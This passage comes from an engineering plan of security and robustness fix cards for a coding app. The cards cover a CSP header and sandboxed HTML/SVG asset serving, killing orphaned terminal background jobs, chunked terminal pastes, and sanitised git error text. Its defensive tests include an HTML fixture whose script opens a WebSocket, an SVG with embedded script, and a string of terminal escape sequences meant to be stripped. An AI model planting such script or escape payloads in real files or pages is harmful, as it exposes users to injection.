    - `serves workspace html and svg assets sandboxed and as attachments`: `baseDir = yield* fileSystem.makeTempDirectoryScoped({ prefix: "neokod-asset-http-" })`, `root = yield* fileSystem.makeTempDirectoryScoped({ prefix: "neokod-asset-ws-" })`; write `root/report.html` = `<script>new WebSocket("ws://" + location.host + "/ws")</script>`, `root/mark.svg` = `<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>`, `root/doc.pdf` = `%PDF-1.4`. `yield* buildAppUnderTest({ config: { baseDir } })`. Mint URLs with the same layer pattern as `apps/server/src/assets/AssetAccess.test.ts:19-24` but built on the server's base dir so the signing key file is shared: `const mintLayer = Layer.mergeAll(ServerConfig.ServerConfig.layerTest(process.cwd(), baseDir), WorkspacePaths.layer, ProjectFaviconResolver.layer.pipe(Layer.provide(WorkspacePaths.layer)), ServerSecretStore.layer.pipe(Layer.provide(ServerConfig.ServerConfig.layerTest(process.cwd(), baseDir))))`; then `issueAssetUrl({ resource: { _tag: "workspace-file", threadId: ThreadId.make("thread-1"), path: join(root, "report.html") }, workspaceRoot: root }).pipe(Effect.provide(mintLayer))` for each file. `fetchEffect(await getHttpServerUrl(relativeUrl))`. Assert for html: status 200, `content-type` starts with `text/html`, `content-security-policy === "sandbox"`, `content-disposition === "attachment"`, `x-content-type-options === "nosniff"`. For svg: CSP `"default-src 'none'; sandbox"` and `attachment`. For pdf: `content-security-policy === undefined`, `content-disposition === undefined`. If `ServerSecretStore` caches the key in memory per layer and the two instances disagree, the fetch returns 404; in that case mint through the served app instead by calling the `assets.createUrl` RPC with `withWsRpcClient` and mocked `projectionSnapshotQuery` (pattern at `ws.ts:2226` handler, mocks at `server.test.ts:321`). Record which route was used in the PR.
    - Both tests must fail on base: base sends no CSP on the shell and `content-security-policy` is undefined for html assets.
- Verify:
  - From `apps/server`: `PATH=<node24>:$PATH pnpm exec vp test run src/http.test.ts src/server.test.ts` (all green), `pnpm exec tsgo --noEmit`. From the repo root: `vp check` and `vp run typecheck`.
  - Browser, no CSP violations (run before merging; needs the built web app): from the repo root `vp run --filter @neokod/web build` then `vp run --filter neokod build`, then `node apps/server/dist/bin.mjs serve --port 3790 --no-browser --base-dir /tmp/neokod-csp-check` (the `serve` command and the `--port`, `--no-browser`, `--base-dir` flags are in `apps/server/src/cli/server.ts:26` and `cli/config.ts:25-39`; add whatever token flag the access-token cards introduce). Open `http://127.0.0.1:3790/` in Chromium, DevTools Console and filter on `Content Security Policy`: expect no "Refused to ..." messages while you (1) load the app, (2) open a thread, a code file preview and a diff (exercises the diff worker and syntax-highlighter wasm), (3) open the terminal drawer, (4) open Settings. For an automated pass, a throwaway Playwright script (the repo has `playwright` 1.58.2 in `apps/web/package.json`, do not commit it) that registers `page.on("console", m => /Content Security Policy|Refused to/.test(m.text()) && violations.push(m.text()))` and `await page.addInitScript(() => document.addEventListener("securitypolicyviolation", (e) => (window.__csp = [...(window.__csp ?? []), e.violatedDirective + " " + e.blockedURI])))` must end with an empty list after the four steps. Then `curl -sI http://127.0.0.1:3790/` shows the header set, and opening an asset URL minted for an `.html` file in a new tab downloads the file instead of rendering it, with no WebSocket opened (server log shows no new `/ws` connection).
- Depends on: none (coordinate with X-12: its remote-image button depends on `img-src` keeping `https:` and `http:`). Effort: M. Commit message: `fix(server): add app-shell CSP and sandbox workspace HTML and SVG assets as attachments`

### X-14 Closing a terminal, deleting a thread or stopping the server must stop the background jobs started in the terminal (TG-01)

- Problem: `runKillEscalation` (`apps/server/src/terminal/Manager.ts:1280-1328`) sends SIGTERM and then SIGKILL to the shell pid only (`process.kill("SIGTERM")` at line 1286, `process.kill("SIGKILL")` at line 1311), and node-pty's `kill` is `process.kill(this.pid, signal)` (`node_modules/.pnpm/node-pty@1.1.0/node_modules/node-pty/lib/unixTerminal.js:226-228`). The foreground job dies when the kernel hangs up the tty, but `sleep 300 &`, `nohup cmd &` and `(cmd &)` survive and are reparented to PID 1 (rt-e TG-01, also on graceful server shutdown). A plain `kill(-shellPid)` is not enough: interactive zsh and bash put every background job in its own process group. Measured on macOS with node-pty and `/bin/zsh -f -i`: shell `pid 44197 pgid 44197`, `sleep 311 &` is `pid 44208 pgid 44208`, `sleep 313 | cat &` is `pgid 44222`, and `(sleep 312 &)` is `ppid 1 pgid 44220` while the shell is still alive, so a process-tree walk misses it too. All of them keep the terminal as their controlling tty.
- Files to change:
  - `packages/shared/src/processGroup.ts` : add `parsePsPidPgidTty`, `selectControllingTtyProcessGroups`, `listControllingTtyProcessGroups` (file is 528 lines; `isGroupSignalingSupported` at line 51, `makeProvenGroupIdentity` at line 107, `posixProcessGroupSignaller` at line 160, `terminateProcessGroup` at line 244). The export `@neokod/shared/processGroup` already exists in `packages/shared/package.json:146-148`.
  - `packages/shared/src/processGroup.test.ts` : unit tests for the three new functions.
  - `apps/server/src/terminal/Manager.ts` : imports (lines 35 to 37), `TerminalManagerOptions` (line 1123, `processKillGraceMs` at line 1131), bindings (line 1182), `runKillEscalation` (line 1280). The callers need no change: `stopProcess` (line 1745, call at line 1770), the spawn-failure path (line 1920) and the shutdown finalizer `cleanupSession` (lines 2111 to 2118, call at 2117) all go through `runKillEscalation`.
  - `apps/server/src/terminal/Manager.test.ts` : `CreateManagerOptions` (line 204), `createManager` (line 226, `makeWithOptions` call at line 241), new tests at the end of the `it.layer(...)("TerminalManager")` block (ends line 1704).
- Change:
  1. Shared helpers. In `processGroup.ts` add `import * as NodeUtil from "node:util";` next to the existing `node:child_process` import (the file already disables the `nodeBuiltinImport` diagnostic on line 1) and append:

     ```ts
     export interface PsPidPgidTtyRow {
       readonly pid: number;
       readonly pgid: number;
       readonly tty: string;
     }

     /** Parse `ps -A -o pid=,pgid=,tty=` output. Lines that do not have three columns are ignored. */
     export const parsePsPidPgidTty = (stdout: string): ReadonlyArray<PsPidPgidTtyRow> => {
       const rows: Array<PsPidPgidTtyRow> = [];
       for (const line of stdout.split("\n")) {
         const [pidText, pgidText, tty] = line.trim().split(/\s+/);
         const pid = Number(pidText);
         const pgid = Number(pgidText);
         if (!Number.isInteger(pid) || !Number.isInteger(pgid) || tty === undefined) continue;
         rows.push({ pid, pgid, tty });
       }
       return rows;
     };

     const NO_CONTROLLING_TTY = new Set(["?", "??", "-"]);

     /**
      * Process-group ids of every process that shares the controlling tty of `rootPid`
      * (the pty child, which is the session leader). Excludes the server's own group.
      * Returns [] when the root is not in the table or has no tty, so callers fall back.
      */
     export const selectControllingTtyProcessGroups = (
       rows: ReadonlyArray<PsPidPgidTtyRow>,
       input: { readonly rootPid: number; readonly ownPid: number },
     ): ReadonlyArray<number> => {
       const root = rows.find((row) => row.pid === input.rootPid);
       if (root === undefined || NO_CONTROLLING_TTY.has(root.tty)) return [];
       const ownGroup = rows.find((row) => row.pid === input.ownPid)?.pgid;
       const groups = new Set<number>();
       for (const row of rows) {
         if (row.tty !== root.tty || row.pgid <= 1 || row.pgid === ownGroup) continue;
         groups.add(row.pgid);
       }
       return [...groups];
     };

     const execFileText = NodeUtil.promisify(NodeChildProcess.execFile);

     export const listControllingTtyProcessGroups = (
       rootPid: number,
       platform: NodeJS.Platform,
     ): Effect.Effect<ReadonlyArray<number>> =>
       !isGroupSignalingSupported(platform) || !Number.isInteger(rootPid) || rootPid <= 1
         ? Effect.succeed([])
         : Effect.tryPromise(() =>
             execFileText("ps", ["-A", "-o", "pid=,pgid=,tty="], {
               encoding: "utf8",
               maxBuffer: 16 * 1024 * 1024,
               timeout: 3_000,
             }),
           ).pipe(
             Effect.map(({ stdout }) =>
               selectControllingTtyProcessGroups(parsePsPidPgidTty(stdout), {
                 rootPid,
                 ownPid: process.pid,
               }),
             ),
             Effect.orElseSucceed(() => []),
           );
     ```

     Why the controlling tty: it is the one property that all of the shell's jobs keep (verified on macOS for plain `&`, a pipeline, `(cmd &)` and `nohup cmd &` in both zsh and bash). A program that deliberately detaches with `setsid` (tmux, a daemon) loses the tty and is left alone, which is the right outcome. `ps -A -o pid=,pgid=,tty=` is POSIX and was run on macOS (tty column `ttys009`, `??` for none). On Linux procps prints `pts/3` and `?`; if `ps` is missing or fails the function returns `[]`.

  2. `Manager.ts` imports: add `import { listControllingTtyProcessGroups, makeProvenGroupIdentity, posixProcessGroupSignaller, terminateProcessGroup, type ProcessGroupSignaller } from "@neokod/shared/processGroup";` after the `hostProcess` import (line 36).
  3. `TerminalManagerOptions` (after `processKillGraceMs?` at line 1131) add the two test seams:
     ```ts
     /** Process-group ids to terminate for a terminal pid. Default: groups sharing the pty's controlling tty. */
     processGroupLister?: (terminalPid: number) => Effect.Effect<ReadonlyArray<number>>;
     processGroupSignaller?: ProcessGroupSignaller;
     ```
     After line 1182 add:
     ```ts
     const processGroupLister =
       options.processGroupLister ??
       ((terminalPid) => listControllingTtyProcessGroups(terminalPid, platform));
     const processGroupSignaller = options.processGroupSignaller ?? posixProcessGroupSignaller;
     ```
     (`platform` is bound at line 1166 from `HostProcessPlatform`.)
  4. `runKillEscalation` (line 1280). Insert at the top of the generator body, before the existing `const terminated = ...`:
     ```ts
     const groupIds = yield * processGroupLister(process.pid);
     if (groupIds.length > 0) {
       const outcomes =
         yield *
         Effect.forEach(
           groupIds,
           (pgid) => {
             // pgid comes from a live process table, and a process group id cannot be reused
             // while the group has members, so signalling -pgid right after the snapshot is safe.
             const proven = makeProvenGroupIdentity({ pid: pgid, pgid, spawnedAtMs: 0, platform });
             return proven.ok
               ? terminateProcessGroup(proven.identity, {
                   graceMs: processKillGraceMs,
                   signaller: processGroupSignaller,
                 })
               : Effect.succeed({ status: "unsupported_platform" } as const);
           },
           { concurrency: "unbounded" },
         );
       const failed = outcomes.filter((outcome) => outcome.status === "termination_failed");
       if (failed.length > 0) {
         yield *
           Effect.logWarning("terminal process groups survived SIGKILL", {
             threadId,
             terminalId,
             failed,
           });
       }
       return;
     }
     ```
     Everything below stays as it is. That keeps the Windows branch (the lister returns `[]` there because `isGroupSignalingSupported("win32")` is false) and the fallback when `ps` fails or the shell is already gone: the old single-pid SIGTERM, grace, SIGKILL. The shell's own group (pgid equals the shell pid) is in the list, so the shell is still terminated. `terminateProcessGroup` sends SIGTERM to each group, polls `isGroupAlive` for `processKillGraceMs` (1 s by default, line 80), then SIGKILL, so the worst case per close is about 1.25 s, as before plus the 250 ms settle in the helper.
  5. Test seam in `Manager.test.ts`. Add `processGroupLister?` and `processGroupSignaller?` to `CreateManagerOptions` (line 204). In `createManager`'s `makeWithOptions` call (line 241) pass
     ```ts
     processGroupLister: options.processGroupLister ?? (() => Effect.succeed([])),
     ...(options.processGroupSignaller !== undefined ? { processGroupSignaller: options.processGroupSignaller } : {}),
     ```
     The default empty lister is mandatory: `FakePtyAdapter` pids start at 9000 (`nextPid`, `Manager.test.ts:103`), and with the real lister a fake pid that matches a real process on the developer's machine would make the test signal that user's terminal.
  6. Plan-card interaction (`docs/plan-cards/02-w0-w1-w2-containment.md`). Cards 2.6b-ii (line 1048) and 2.6c (line 1115) edit the same `Manager.ts` and `Manager.test.ts`. No function body overlaps: 2.6b-ii touches `persistWorker` (1352-1380), `flushPersist` (1395), `enqueueProcessEvent` (421), `drainProcessEvents` (1627), the pty callbacks (1873-1884) and `checkSubprocessActivity` (2012-2050); 2.6c touches `capHistory` (855) and its three call sites; this card touches only `runKillEscalation`. Expected textual conflicts, all trivial: (a) the import block near lines 35 to 62 (2.6b-ii adds `writeFileStringAtomically`, `Schedule` and `PlatformError` imports); (b) `TerminalManagerOptions` (line 1123 to 1141): 2.6b-ii adds `persistRetryDelayMs`, 2.6c adds `historyByteLimit`, this card adds two members, all in the same interface; (c) the binding block around lines 1165 to 1185; (d) in `Manager.test.ts`, `CreateManagerOptions` (line 204) and the `makeWithOptions` argument list in `createManager` (line 241 to 258), where 2.6b-ii and 2.6c also add pass-through options, and the `FakePtyAdapter` constructor that 2.6b-ii changes (this card does not touch it). Apply order: land 2.6b-ii, then 2.6c, then this card, and re-read every line number above after those two; the plan's own order puts them at positions 8 and 9 of the W2 list, so this card goes after that group.

- Do not:
  - Do not stop at `process.kill(-shell.pid)`; in an interactive shell that reaches only the foreground job (see the measurements above) and the test below would still fail.
  - Do not use `pkill -f`, command-name matching or the server's `subprocessInspector` process-tree walk as the source of what to kill; the first is unsafe and the second misses `(cmd &)` orphans that are already children of PID 1.
  - Do not change the Windows path, remove the single-pid fallback, or call the shared helper with a pgid that came from anything other than the process-table snapshot of the pty's own tty.
  - Do not let the real lister run in tests that use `FakePtyAdapter` (see step 5).
- Tests:
  - `packages/shared/src/processGroup.test.ts` (extend; plain `describe`/`it` from `@effect/vitest`, as the file does):
    - `parsePsPidPgidTty skips malformed lines`: input `"  100   100 ttys009\n  101   101 ??\nnot a row\n\n"` gives `[{ pid: 100, pgid: 100, tty: "ttys009" }, { pid: 101, pgid: 101, tty: "??" }]`.
    - `selectControllingTtyProcessGroups returns every group on the shell's tty`: rows shell `100/100/ttys009`, job `101/101/ttys009`, pipeline member `103/102/ttys009`, other terminal `200/200/ttys010`, daemon `300/300/??`, server `50/50/ttys001`, and a stray `400/50/ttys009`; with `{ rootPid: 100, ownPid: 50 }` expect `[100, 101, 102]` after sorting (the stray row is dropped because its group is the server's).
    - `selectControllingTtyProcessGroups fails closed`: root pid absent gives `[]`; root with tty `??` gives `[]`; root with tty `-` gives `[]`.
    - `listControllingTtyProcessGroups does nothing on win32`: `Effect.runPromise(listControllingTtyProcessGroups(1234, "win32"))` resolves to `[]`.
  - `apps/server/src/terminal/Manager.test.ts`:
    - `terminates every process group reported for the terminal` (fake pty): `createManager(5, { processGroupLister: () => Effect.succeed([7001, 7002]), processGroupSignaller: signaller, processKillGraceMs: 10 })` where `signaller` records `[pgid, signal]` and has `signalGroup: (pgid, signal) => Effect.sync(() => { calls.push([pgid, signal]); return "sent"; })` and `isGroupAlive: () => Effect.succeed(false)`. `manager.open(openInput())`, `manager.close({ threadId: "thread-1" })`, then `waitFor(Effect.sync(() => calls.length === 2))`. Assert `calls` equals `[[7001, "SIGTERM"], [7002, "SIGTERM"]]` (as a set), and `ptyAdapter.processes[0].killSignals` is empty (no single-pid kill). No `TestClock` layer for this test.
    - `escalates to SIGKILL per group when a group survives SIGTERM`: same, but `isGroupAlive: (pgid) => Effect.sync(() => !calls.some(([g, s]) => g === pgid && s === "SIGKILL"))`, so each group stays alive until it has been sent SIGKILL; assert both groups received `SIGTERM` then `SIGKILL` (waitFor with a 2000 ms timeout; the helper settles for 250 ms after SIGKILL).
    - `falls back to the shell pid when no group is reported`: the existing test at line 1188 (`escalates terminal shutdown to SIGKILL...`) already asserts this path with the default empty lister; leave it unchanged and cite it.
    - Real pty, `closing a terminal kills its background jobs` (new, POSIX only; first lines `if ((yield* HostProcessPlatform) === "win32") return;` and `if (!(yield* fileSystem.exists("/bin/bash"))) return;`; the file's convention for skipping, see line 481): `const adapter = yield* NodePtyAdapter.make();` (import `* as NodePtyAdapter from "./NodePtyAdapter.ts"`), `dir = yield* fileSystem.makeTempDirectoryScoped({ prefix: "neokod-terminal-bg-" })`, `manager = yield* TerminalManager.makeWithOptions({ logsDir: join(dir, "logs"), ptyAdapter: adapter, shellResolver: () => "/bin/bash", env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: dir, TERM: "xterm" }, processKillGraceMs: 200 })` (no lister option, so the real one runs). `yield* manager.open(openInput({ cwd: dir }))`, then three `manager.write` calls: `"sleep 300 & echo $! > a.pid\n"`, `"nohup sleep 301 >/dev/null 2>&1 & echo $! > b.pid\n"`, `"(sleep 302 & echo $! > c.pid)\n"`. `waitFor` (5000 ms) until the three files exist and parse as positive integers. Assert each pid is alive (`process.kill(pid, 0)` does not throw). `yield* manager.close({ threadId: "thread-1", deleteHistory: true })`. `waitFor` (8000 ms) until `process.kill(pid, 0)` throws `ESRCH` for all three. Wrap the body in `Effect.ensuring` that SIGKILLs each recorded pid, so a failing run does not leave `sleep` processes behind. This test must fail on the base commit: bash ignores SIGTERM, base then SIGKILLs only the shell, and the three sleepers stay alive until the ensuring block kills them.
    - Real pty, `closing the manager scope kills background jobs` (same guards): build the manager under `const scope = yield* Scope.make("sequential")` with `Effect.provideService(Scope.Scope, scope)` as in the test at line 1684, start `sleep 303 & echo $! > a.pid`, then `yield* Scope.close(scope, Exit.void)` and assert the pid is gone with the same polling. Covers server shutdown through the finalizer at line 2098.
- Verify: from `packages/shared`: `PATH=<node24>:$PATH pnpm exec vp test run src/processGroup.test.ts` and `pnpm exec tsgo --noEmit`. From `apps/server`: `pnpm exec vp test run src/terminal/Manager.test.ts` (all green, no leftover `sleep 30x` processes: `pgrep -fl "sleep 30"` prints nothing afterwards) and `pnpm exec tsgo --noEmit`. Root: `vp check`, `vp run typecheck`. Manual: run the app, open a thread terminal, run `sleep 777 &` and `(sleep 778 &)`, close the terminal or delete the thread, then `pgrep -fl "sleep 77"` is empty within about 2 seconds. Stop the server with SIGTERM while a terminal has `sleep 779 &`; `pgrep -fl "sleep 779"` is empty.
- Depends on: none in this pack; apply after plan cards 2.6b-ii and 2.6c (see step 6). Effort: M. Commit message: `fix(terminal): terminate background jobs sharing the pty tty when a terminal closes`

### X-15 Terminal paste over 64 KiB: send it in ordered chunks, and stop echoing the whole paste in the error text (TG-09)

- Problem: `TerminalWriteInput.data` is limited to 65,536 characters (`packages/contracts/src/terminal.ts:62`, `Schema.isMaxLength(65_536)`), and the drawer sends every xterm `onData` string as one RPC (`terminal.onData` at `apps/web/src/components/ThreadTerminalDrawer.tsx:620-632`, `writeTerminal` at lines 354 to 359). A larger paste fails schema decoding on the server, nothing reaches the shell, and the failure message, which contains the whole pasted value (`Expected a value with a length of at most 65536, got "pppp..."`), is written into the terminal by `writeSystemMessage` (line 84; call at line 626 to 631). rt-e measured a 998,889 byte paste: `paste.out` stayed empty and about 1 MB of text landed in the scrollback.
- Files to change:
  - `packages/contracts/src/terminal.ts` : add `TERMINAL_WRITE_MAX_LENGTH`, use it in `TerminalWriteInput` (line 60 to 64).
  - `packages/contracts/src/terminal.test.ts` : boundary tests next to `describe("TerminalWriteInput")` (line 126).
  - `packages/client-runtime/src/state/terminalSession.ts` : add `TERMINAL_WRITE_CHUNK_LENGTH`, `splitTerminalInput`, `createTerminalInputQueue` (imports at lines 1 to 8, the file has only `import type` today). It is re-exported through `packages/client-runtime/src/state/terminal.ts:95` (`export * from "./terminalSession.ts"`), so the import path is `@neokod/client-runtime/state/terminal`.
  - `packages/client-runtime/src/state/terminalSession.test.ts` : unit tests.
  - `apps/web/src/components/ThreadTerminalDrawer.tsx` : `writeSystemMessage` (line 84), `writeTerminal` (line 354), new exported `formatTerminalSystemMessage`.
  - `apps/web/src/components/ThreadTerminalDrawer.test.ts` : tests for `formatTerminalSystemMessage` (the file already imports pure helpers from `./ThreadTerminalDrawer`).
- Change:
  1. Contracts. Before `TerminalWriteInput` (line 60) add `export const TERMINAL_WRITE_MAX_LENGTH = 65_536;` and change line 62 to `data: Schema.String.check(Schema.isNonEmpty()).check(Schema.isMaxLength(TERMINAL_WRITE_MAX_LENGTH)),`. The limit and the type stay as they are. The contracts package keeps constants like `DEFAULT_TERMINAL_ID` (line 9), so this is not runtime logic.
  2. Client runtime, in `terminalSession.ts`. Add `import { TERMINAL_WRITE_MAX_LENGTH } from "@neokod/contracts";` next to the existing type import, then:

     ```ts
     /** Half the server limit, so a chunk never sits at the boundary. */
     export const TERMINAL_WRITE_CHUNK_LENGTH = TERMINAL_WRITE_MAX_LENGTH / 2;

     /** Split input into pieces of at most `maxLength` UTF-16 units without cutting a surrogate pair. */
     export function splitTerminalInput(
       data: string,
       maxLength: number = TERMINAL_WRITE_CHUNK_LENGTH,
     ): ReadonlyArray<string> {
       const size = Math.max(2, Math.floor(maxLength));
       if (data.length <= size) return [data];
       const chunks: Array<string> = [];
       let start = 0;
       while (start < data.length) {
         let end = Math.min(start + size, data.length);
         if (end < data.length) {
           const last = data.charCodeAt(end - 1);
           if (last >= 0xd800 && last <= 0xdbff) end -= 1;
         }
         chunks.push(data.slice(start, end));
         start = end;
       }
       return chunks;
     }

     export interface TerminalInputQueue {
       readonly write: <R extends { readonly _tag: string }>(
         data: string,
         send: (chunk: string) => Promise<R>,
       ) => Promise<R>;
     }

     /**
      * Whole writes run one after another, and the chunks of one write run one after another.
      * Each chunk waits for the server to acknowledge the previous one (backpressure), a
      * keystroke typed during a paste lands after the paste, and the first failed chunk stops
      * the rest of that write and is returned to the caller.
      */
     export function createTerminalInputQueue(): TerminalInputQueue {
       let tail: Promise<unknown> = Promise.resolve();
       return {
         write: <R extends { readonly _tag: string }>(
           data: string,
           send: (chunk: string) => Promise<R>,
         ): Promise<R> => {
           const run = async (): Promise<R> => {
             let result: R | undefined;
             for (const chunk of splitTerminalInput(data)) {
               result = await send(chunk);
               if (result._tag !== "Success") return result;
             }
             return result as R;
           };
           const next = tail.then(run, run);
           tail = next.catch(() => undefined);
           return next;
         },
       };
     }
     ```

     `splitTerminalInput` always returns at least one element, so `result` is set when the loop ends. The success tag of `AtomCommandResult` is `"Success"` (the drawer already compares `result._tag === "Success"` at line 622 to 624).

  3. Drawer send path. In `ThreadTerminalDrawer.tsx` add `createTerminalInputQueue` to an import from `@neokod/client-runtime/state/terminal`, and replace `writeTerminal` (lines 354 to 359) with
     ```ts
     const [terminalInputQueue] = useState(createTerminalInputQueue);
     const writeTerminal = useEffectEvent((data: string) =>
       terminalInputQueue.write(data, (chunk) =>
         runTerminalWrite({
           environmentId,
           input: { threadId, terminalId, data: chunk },
         }),
       ),
     );
     ```
     (`useState` is already imported, line 31; the `useState` line goes above `writeTerminal`.) Both existing callers, `sendTerminalInput` (line 489 to 497, navigation shortcuts) and the `onData` handler (line 620 to 632), keep their code: they get one result back, a failure from the first chunk that failed. `ChatView.tsx` writes short commands directly through `terminalEnvironment.write` (lines 760, 2537, 2649) and is not changed.
  4. Error text. In `ThreadTerminalDrawer.tsx` replace `writeSystemMessage` (line 84 to 86) with

     ```ts
     const TERMINAL_SYSTEM_MESSAGE_MAX_LENGTH = 240;

     /** System messages are written into the terminal, so cap their length and drop control characters. */
     export function formatTerminalSystemMessage(message: string): string {
       const head = message
         .slice(0, TERMINAL_SYSTEM_MESSAGE_MAX_LENGTH)
         .replace(/[\ud800-\udbff]$/, "")
         .replace(/[\u0000-\u001f\u007f-\u009f]+/g, " ");
       return message.length > TERMINAL_SYSTEM_MESSAGE_MAX_LENGTH
         ? `${head}... (message shortened, ${message.length} characters)`
         : head;
     }

     function writeSystemMessage(terminal: Terminal, message: string): void {
       terminal.write(`\r\n[terminal] ${formatTerminalSystemMessage(message)}\r\n`);
     }
     ```

     All seven call sites (lines 495, 577, 585, 609, 627, 738, 749) go through this function, so no call site changes. Stripping control characters matters because a failure message can contain pasted bytes, and an ESC in it would be interpreted by xterm when printed.

- Do not:
  - Do not raise the server limit in the contract or catch the schema error on the server; the limit protects the WebSocket frame and the pty write, and chunking is the intended client behaviour.
  - Do not send chunks concurrently with `Promise.all`, and do not use `createEnvironmentRpcCommand` concurrency modes to order them: the serial scheduler would order single RPCs but not keep a paste contiguous when a keystroke arrives.
  - Do not split on a fixed byte count of UTF-8 or inside a surrogate pair; the limit is in UTF-16 units and a lone surrogate cannot be JSON encoded losslessly.
  - Do not add a total paste cap in this card; if the owner wants one it is a separate decision (Open questions). Known tradeoff: Ctrl-C typed while a very large paste is still streaming waits behind it, because bytes reach the shell in the order they were produced.
- Tests (all must fail on the base commit: the new exports do not exist, and the contract constant is missing):
  - `packages/contracts/src/terminal.test.ts` (extend, reuse `decodes`): `TerminalWriteInput accepts exactly TERMINAL_WRITE_MAX_LENGTH characters` with `data: "a".repeat(TERMINAL_WRITE_MAX_LENGTH)` true; `rejects one character more` with `"a".repeat(TERMINAL_WRITE_MAX_LENGTH + 1)` false; `TERMINAL_WRITE_MAX_LENGTH is 65536`.
  - `packages/client-runtime/src/state/terminalSession.test.ts` (extend; plain `vite-plus/test`):
    - `splitTerminalInput returns short input unchanged`: `splitTerminalInput("echo hi\n")` equals `["echo hi\n"]`.
    - `splitTerminalInput keeps every chunk within the limit and the order`: `const data = Array.from({ length: 100_001 }, (_, i) => String.fromCharCode(97 + (i % 26))).join("")`; chunks `splitTerminalInput(data)`: every `chunk.length <= TERMINAL_WRITE_CHUNK_LENGTH`, `chunks.join("") === data`, `chunks.length === 4`, and `TERMINAL_WRITE_CHUNK_LENGTH <= TERMINAL_WRITE_MAX_LENGTH`.
    - `splitTerminalInput does not cut a surrogate pair`: `splitTerminalInput("ab😀cd", 3)` equals `["ab", "😀", "cd"]` and no chunk starts with a low surrogate or ends with a high surrogate.
    - `createTerminalInputQueue sends chunks of one write in order and waits for each ack`: `send` records chunk and returns a promise resolved from a manual deferred list; start `queue.write("x".repeat(70_000), send)`; assert `sent.length === 1` before resolving the first deferred, resolve it and `await Promise.resolve()` loops until `sent.length === 2`, resolve the second; result `_tag` is `"Success"`; `sent.map((s) => s.length)` equals `[32768, 32768, 4464]`.
    - `createTerminalInputQueue keeps whole writes in order`: call `write("A".repeat(40_000), send)` and immediately `write("B", send)`; resolve acks as they arrive; assert the recorded sequence is `["A".repeat(32768), "A".repeat(7232), "B"]`.
    - `createTerminalInputQueue stops at the first failure`: `send` returns `{ _tag: "Failure" }` for the second chunk; a three chunk write returns that failure object and `sent.length === 2`; a following `write("ok", send)` still runs.
  - `apps/web/src/components/ThreadTerminalDrawer.test.ts` (extend, import `formatTerminalSystemMessage`): `formatTerminalSystemMessage leaves short messages alone` (`"Terminal closed"` returns the same string); `formatTerminalSystemMessage shortens a message that echoes a large paste`: input `` `Expected a value with a length of at most 65536, got "${"p".repeat(1_000_000)}"` `` gives `result.length < 400`, `result.includes("message shortened")`, and fewer than 300 `p` characters (`result.split("p").length - 1 < 300`); `formatTerminalSystemMessage removes control characters`: `"\u001b[2Jboom\r\nline\u0007"` has none of `\u001b`, `\r`, `\n`, `\u0007` in the result and still contains `boom` and `line`.
- Verify: `PATH=<node24>:$PATH`; from `packages/contracts` `pnpm exec vp test run src/terminal.test.ts`; from `packages/client-runtime` `pnpm exec vp test run src/state/terminalSession.test.ts`; from `apps/web` `pnpm exec vp test run src/components/ThreadTerminalDrawer.test.ts`; `pnpm exec tsgo --noEmit` in each of the three packages; root `vp check` and `vp run typecheck`. Manual (run the app, open a thread terminal): `cat > /tmp/paste.out`, paste a text of about 1 MB (for example `head -c 1000000 /dev/urandom | base64 | pbcopy`), press Ctrl-D, then `wc -c /tmp/paste.out` equals the pasted size, `cmp` against the clipboard source shows no difference, and the terminal shows no `[terminal] Expected a value...` line. The shortened error text is covered by the unit tests, because after chunking no normal input reaches the schema limit.
- Depends on: none. Effort: S. Commit message: `fix(web): send large terminal pastes in ordered chunks and shorten terminal error text`

### X-16 Carry a bounded, sanitised git stderr tail in `GitCommandError` and show it in error toasts (TG-07)

- Problem: when git fails, `GitCommandError` keeps only `stderrLength` (`packages/contracts/src/git.ts:330`), so a rejected push, a path collision on `worktree add` or a checkout blocked by local changes all read `Git command failed in <operation> (<cwd>): Git command exited with a non-zero status.` (`apps/server/src/vcs/GitVcsDriverCore.ts:884`; `executeRaw` builds the same error at lines 801 to 808). rt-e reproduced it with a non-fast-forward push: 523 bytes of stderr were dropped. The toast and the stacked-action `action_failed` event both show `error.message` (`apps/web/src/components/gitActions/useGitActionsController.ts:585` and `apps/server/src/git/GitManager.ts:2043`), so the reason is lost everywhere.
- Files to change:
  - `packages/shared/src/git.ts` : add `GIT_STDERR_TAIL_MAX_CHARS` and `sanitizeGitStderrTail` (file already exports git helpers such as `normalizeGitRemoteUrl`, line 103; the `@neokod/shared/git` export exists, `packages/shared/package.json:18`).
  - `packages/shared/src/git.test.ts` : table tests.
  - `packages/contracts/src/git.ts` : `GitCommandError` (lines 323 to 338): new optional field and message.
  - `packages/contracts/src/git.test.ts` : message tests.
  - `apps/server/src/vcs/GitVcsDriverCore.ts` : helper next to `gitCommandContext` (line 350) and five error sites: `executeRaw` (line 801), `executeGit` (line 882), `statusDetailsRemote.branch` (line 1288), `statusDetails.status` (line 1412), `listRefs` (line 2106).
  - `apps/server/src/vcs/GitVcsDriverCore.test.ts` : new tests (reuse `makeProcessHandle`, `makeTmpDir`, `git`, `initRepoWithCommit`, lines 28 to 100).
  - `apps/web/src/components/ui/toast.logic.ts` and `toast.tsx` : move `errorDescriptionClampClass` (`toast.tsx:90-99`) into `toast.logic.ts`, keep newlines, make long multi-line error text scrollable; `apps/web/src/components/ui/toast.logic.test.ts` : tests.
- Change:
  1. Sanitiser in `packages/shared/src/git.ts` (pure, no Node imports; the server passes the home directory in):

     ```ts
     export const GIT_STDERR_TAIL_MAX_CHARS = 2048;
     const STDERR_INPUT_WINDOW_CHARS = 8192;
     const MIN_REDACTED_VALUE_LENGTH = 4;
     const ANSI_ESCAPE_PATTERN = /\u001b\[[0-9;?]*[ -/]*[@-~]/g;
     const CONTROL_CHARACTER_PATTERN = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g;
     const URL_USERINFO_PATTERN = /\b([a-z][a-z0-9+.-]*:\/\/)[^\s/@'"]+@/gi;

     const escapeRegExp = (value: string) => value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

     /**
      * Last lines of git's stderr, safe to show to the user: bounded, free of control
      * characters and progress redraws, URL credentials removed, the home directory
      * shown as `~`, and any `--name=value` argument values hidden.
      */
     export function sanitizeGitStderrTail(
       stderr: string,
       options: {
         readonly homeDir?: string | undefined;
         readonly redactValues?: ReadonlyArray<string> | undefined;
       } = {},
     ): string | undefined {
       let text =
         stderr.length > STDERR_INPUT_WINDOW_CHARS
           ? stderr.slice(-STDERR_INPUT_WINDOW_CHARS)
           : stderr;
       text = text
         .replace(ANSI_ESCAPE_PATTERN, "")
